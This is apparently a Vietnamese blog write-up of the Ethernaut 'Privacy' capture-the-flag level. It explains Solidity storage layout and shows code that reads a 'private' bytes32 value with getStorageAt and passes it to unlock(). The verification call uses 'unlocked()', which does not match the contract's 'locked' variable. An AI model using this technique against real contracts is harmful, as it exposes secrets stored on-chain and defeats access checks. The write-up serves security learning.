---
layout: post
title: "The Ethernaut: 12 - Privacy"
mathjax: true
---
Nightmare nerver ending!

Ethernaut mới gần đây đã cho ra đời thêm 4 thử thách nữa, và nhiệm vụ của chúng ta vẫn chỉ duy nhất là: vượt qua nó.

# 12. Privacy 　★★★★★★★★

**Nhiệm vụ**: unlock contract là xong.

```js
pragma solidity ^0.4.18;

contract Privacy {

  bool public locked = true;
  uint256 public constant ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;

  function Privacy(bytes32[3] _data) public {
    data = _data;
  }

  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

## Phân tích

Để giải quyết được bài toán này các bạn phải hiểu được cách mà storage hoạt động trong solidity. Về cơ bản thì phần này khá là dài và rắc rối, nên mình sẽ chỉ nói những phần cơ bản nhất để ta có thể làm được bài này, các bạn có thể đọc kỹ thêm [tại đây](http://solidity.readthedocs.io/en/v0.4.24/miscellaneous.html)

- Các biến sẽ được gộp lại thành từng slot có độ dài 32 bytes (256 bits), tức 64 ký tự hexa
- Các biến sẽ lần lượt được đưa vào slot, nếu không vừa thì sẽ được đưa sang slot mới
- *Static array* luôn sinh một slot mới, và cũng đưa các phần tử lần lượt vào slot như trên.
- *constant* sẽ không được lưu vào storage

Note: nếu bạn dùng biến có độ dài nhỏ hơn 32 bytes, có thể contract của bạn sẽ tốn nhiều gas hơn! Vì EVM trong ethereum xử lý theo từng block 32 bytes mỗi phép tính, nên nếu có nhiều thành phần nhỏ hơn 32 bytes thì EVM sẽ phải tốn thêm phép tính để giảm size từ 32 bytes về size mà bạn đã định nghĩa.

Nhìn qua các biến của contract:

```js
bool public locked = true;
uint256 public constant ID = block.timestamp;
uint8 private flattening = 10;
uint8 private denomination = 255;
uint16 private awkwardness = uint16(now);
bytes32[3] private data;
```

như trên, ta sẽ có các slot như sau:

- slot 0: locked, flattening, denomination, awkwardness
- slot 1: data[0] (do mỗi thành phần của data đã là 32 bytes rồi)
- slot 2: data[1]
- slot 3: data[2]

vì thế `data[2]` sẽ có index là 3 trong storage của contract.

## Solution

sử dụng hàm `web3.eth.getStorageAt()` để lấy ra `data[2]`

```js
web3.eth.getStorageAt(instance, 3, function (error,result) {alert(result); })
0x637a643557a340c479666c021cd18ee92449d19ff85bd81414bd52b54422cda5
```

- do hàm `unlock` chỉ cần `bytes16` thôi nên ta cắt đi một nửa độ dài đi và submit là xong (hoặc để cả cũng không sao)

```js
// nhớ thay bằng đoạn string mà bạn lấy được bên trên
await contract.unlock("0x637a643557a340c479666c021cd18ee9")
```

- kiểm tra lại tình trạng khoá của contract:

```js
await contract.unlocked()
false
```

- submit && all done!

![completed]({{site.url}}/assets/images/ethernaut-completed.png)

## Bình luận

- Các bài liên quan đến **storage** của solidity luôn rất là rắc rối
- Các bạn có thể tham khảo thêm cách solidity lưu biến [tại đây](https://solidity.readthedocs.io/en/latest/miscellaneous.html#layout-of-state-variables-in-storage)
- Các bạn cũng có thể tham khảo cách decode các tham số trong hàm trong solidity [tại đây](https://medium.com/aigang-network/how-to-read-ethereum-contract-storage-44252c8af925)

**Enjoy Coding!**